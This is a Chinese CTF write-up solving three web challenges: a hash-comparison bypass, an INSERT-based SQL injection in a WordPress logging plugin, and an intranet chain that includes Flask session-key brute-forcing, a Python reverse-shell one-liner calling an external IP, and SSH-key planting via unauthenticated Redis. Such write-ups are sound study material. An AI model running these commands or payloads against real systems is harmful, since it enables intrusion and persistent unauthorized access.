## Web

### signin

本质是要出入相同的`username`和`password`

因为他hash计算以下是这样处理的, 用来格式化字符串，整形也会转化为字符，所以通过这个点来绕过`username`和`password`的比较

```python
c ^= int.from_bytes(hashlib.md5(f"{salt}[{item}]{salt}".encode()).digest(), "big")
```

payload

```json
{"username":"1","password":1}
```

6次base64后

```json
{"params":"VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJFeWVIaFZiR1J6VkZaRmQyTkVUbGhXYldoUVdsY3hVbVZWT1ZsaVIwWlNUVWR6ZVZaR1dtNWtNVUpTVUZRd1BRPT0="}
```

### 出去旅游的心海

给了提示，找记录来访者的接口

```javascript
async function submitVisitorData() {
  try {
    const response = await fetch('http://ip-api.com/json/');
    const ipData = await response.json();

    if (ipData.status === 'success') {
      const ip = ipData.query;
      const country = ipData.country;
      const city = ipData.city;

      const formData = new FormData();
      formData.append('ip', ip);
      formData.append('user-agent', navigator.userAgent);
      
      const dateTime = new Date().toISOString().slice(0, 19).replace('T', ' ');
      formData.append('time', dateTime);

      const infoList = document.createElement('ul');
      infoList.innerHTML = `<li>IP地址: ${ip}</li><li>国家: ${country}</li><li>城市: ${city}</li><li>User Agent: ${navigator.userAgent}</li><li>平台: ${navigator.platform}</li><li>操作系统语言: ${navigator.language}</li><li>访问时间: ${dateTime}</li>`;
      const para = document.createElement('p');
      para.innerHTML = `记到小本本里了~`;
      document.querySelector('.wp-container-1').appendChild(infoList);
      document.querySelector('.wp-container-1').appendChild(para);

      //记到小本本里~
      await fetch('wp-content/plugins/visitor-logging/logger.php', {
        method: 'POST',
        body: formData
      });

    } else {
      console.error('获取IP信息失败');
    }
  } catch (error) {
    console.error('获取IP信息时出错:', error);
  }
}

submitVisitorData();
```

找到这个

```http
wp-content/plugins/visitor-logging/logger.php
```

访问后源码如下

```php
<?php
/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor's identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/

// 不许偷看！这些代码我还在调试呢！
highlight_file(__FILE__);

// 加载数据库配置，暂时用硬编码绝对路径
require_once('/var/www/html/wordpress/' . 'wp-config.php');

$db_user = DB_USER; // 数据库用户名
$db_password = DB_PASSWORD; // 数据库密码
$db_name = DB_NAME; // 数据库名称
$db_host = DB_HOST; // 数据库主机

// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
// 这些是临时的代码

$ip = $_POST['ip'];
$user_agent = $_POST['user_agent'];
$time = stripslashes($_POST['time']);

$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

// 检查连接是否成功
if ($mysqli->connect_errno) {
    echo '数据库连接失败: ' . $mysqli->connect_error;
    exit();
}

$query = "INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)";

// 执行插入
$result = mysqli_query($mysqli, $query);

// 检查插入是否成功
if ($result) {
    echo '数据插入成功';
} else {
    echo '数据插入失败: ' . mysqli_error($mysqli);
}

// 关闭数据库连接
mysqli_close($mysqli);

//gpt真好用
```

简单的Sql的Insert注入，但`$ip`和`$user_agent`似乎会自动过滤单双引号，那就可以瞄准`$time`,报错注入或者盲注都可以

也可以直接SqlMap一把梭

### moeworld

考点说一下

**flask session爆破**

爆破脚本

```python
#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
from itsdangerous import base64_decode
import ast
import os

# Abstract Base Classes (PEP 3119)
if sys.version_info[0] < 3:  # < 3.0
    raise Exception('Must be using at least Python 3')
elif sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    from abc import ABCMeta, abstractmethod
else:  # > 3.4
    from abc import ABC, abstractmethod

# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


if sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4
    class FSCM(metaclass=ABCMeta):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return "[Decoding error] {}".format(e)
                raise e
else:  # > 3.4
    class FSCM(ABC):
        def encode(secret_key, session_cookie_structure):
            """ Encode a Flask session cookie """
            try:
                app = MockApp(secret_key)

                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)

                return s.dumps(session_cookie_structure)
            except Exception as e:
                return "[Encoding error] {}".format(e)
                raise e

        def decode(session_cookie_value, secret_key=None):
            """ Decode a Flask cookie  """
            try:
                if (secret_key == None):
                    compressed = False
                    payload = session_cookie_value

                    if payload.startswith('.'):
                        compressed = True
                        payload = payload[1:]

                    data = payload.split(".")[0]

                    data = base64_decode(data)
                    if compressed:
                        data = zlib.decompress(data)

                    return data
                else:
                    app = MockApp(secret_key)

                    si = SecureCookieSessionInterface()
                    s = si.get_signing_serializer(app)

                    return s.loads(session_cookie_value)
            except Exception as e:
                return False

if __name__ == "__main__":
    cookie_value = "eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6InsyKjJ9In0.ZRwvIA.IVJaZCAL7DmwF7J5CGX8UIHJAAo"
    while True:
        secret_key = "This-random-secretKey-you-can't-get" + os.urandom(2).hex()
        if FSCM.decode(cookie_value, secret_key):
            print(FSCM.decode(cookie_value, secret_key))
            print(secret_key)
            break

    # print(FSCM.encode("This-random-secretKey-you-can't-getff43", "{'power': 'admin', 'user': 'admin'}"))

```

**python反弹Shell**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.43.225.132",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

**proc找内网IP**

```bash
cat /proc/net/fib_trie # ifconfig 和 ip命令都没有，所以可以通过这个来找内网IP
```

**fscan漏扫**

**frp内网穿透**

**mysql密码泄露**

找`dataSql.py`, 密码在里面

**redis未授权写公钥**

```bash
ssh-keygen -t rsa　　# 执行生成key命令
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt　　# 将公钥写入txt
cat /root/.ssh/1.txt | ./redis-cli -h 192.168.0.111 -x set xxx　# 将.ssh目录下的公钥文件1.txt 通过redis-cli客户端写入到目标主机缓冲中
redis-cli -h 192.168.0.111　　　　# 使用客户端登录目标
config set dir /root/.ssh　　   # 设置存储公钥路径
config set dbfilename authorized_keys　　   # 设置文件名称
get xxx　　　　　　# 查看缓存
save　　　　　# 保存缓存到目标主机路径及文件下
exit　　　　# 退出
ssh 192.168.0.111　　# 成功登录
```

